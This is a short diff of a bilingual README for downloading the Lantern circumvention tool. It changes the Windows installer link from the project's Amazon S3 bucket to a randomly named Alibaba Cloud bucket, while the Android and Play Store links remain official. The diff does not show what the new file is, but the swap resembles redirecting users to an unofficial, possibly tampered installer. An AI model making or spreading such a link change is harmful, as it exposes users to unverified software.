@@ -1,7 +1,7 @@
 ## 蓝灯(Lantern)最新版本下载  Download Lantern 
 
 
-[Windows 7及以上系统](https://s3.amazonaws.com/lantern/lantern-installer.exe)       
+[Windows 7及以上系统](https://a304ij88.oss-cn-beijing.aliyuncs.com/lantern-installer.exe)       
 
 [安卓版(4.1+) Android(4.1+)](https://s3.amazonaws.com/lantern/lantern-installer.apk) [Google Play 下载 Download](https://play.google.com/store/apps/details?id=org.getlantern.lantern) 
 
